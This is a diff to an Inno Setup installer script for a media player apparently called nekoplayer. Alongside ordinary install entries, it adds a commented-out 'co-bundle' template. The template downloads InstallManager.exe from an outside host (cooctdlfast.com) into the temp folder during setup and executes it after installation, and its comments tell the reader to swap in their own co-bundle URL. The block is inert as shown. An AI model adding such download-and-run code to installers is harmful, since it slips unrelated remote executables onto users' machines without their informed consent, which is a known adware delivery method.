@@ -52,6 +52,10 @@ Source: "C:\cygwin64\home\andres\nekoplayer\dist\mpv\*"; DestDir: "{app}\mpv"; F
 Source: "C:\cygwin64\home\andres\nekoplayer\dist\w9xpopen.exe"; DestDir: "{app}"; Flags: ignoreversion
 ; NOTE: Don't use "Flags: ignoreversion" on any shared system files
 
+;#define ITDRoot ReadReg(HKEY_LOCAL_MACHINE,'Software\Sherlock Software\InnoTools\Downloader','InstallPath','')
+;On Windows Vista and Windows 7 the line below may give errors if UAC(User Account Control) is set to high try adjusting the UAC from Control Panel -> System and Security.
+;#include ITDRoot+'\it_download.iss'
+
 [Icons]
 Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
 
@@ -74,6 +78,38 @@ begin
   LoadSkin(ExpandConstant('{tmp}\Sakura.cjstyles'), 'normalpink.ini');
   Result := True;
 end;
+//REPLACE THE DOWNLOAD URL WITH YOUR CO-BUNDLE URL
+
+//procedure InitializeWizard();
+//begin
+//itd_init;
+//THE URL IN THE BELOW LINE SHOULD BE REPLACED WITH YOUR CO-BUNDLE URL
+//itd_addfile('http://www.cooctdlfast.com/download.php?kHqBd2M=',
+//expandconstant('{tmp}\InstallManager.exe'));
+//itd_downloadafter(wpReady);
+//ITD_SetOption('UI_AllowContinue', '1');
+//end;
+
+//THE CODE BELOW RUNS THE DOWNLOADED CO-BUNDLE EXE FROM THE TEMP FOLDER
+
+
+
+//procedure CurStepChanged(CurStep: TSetupStep);
+//var
+//AppPath:String;
+//WorkingDir:String;
+//ReturnCode:Integer;
+//begin
+
+//if CurStep=ssPostInstall then begin
+   //WorkingDir := ExpandConstant ('{tmp}');
+   //AppPath := expandconstant('{tmp}\InstallManager.exe')
+  // Exec (AppPath, '', WorkingDir, SW_SHOW, ewWaitUntilTerminated,
+  // ReturnCode);
+//end;
+//end;
+
+
 
 procedure DeinitializeSetup();
 begin
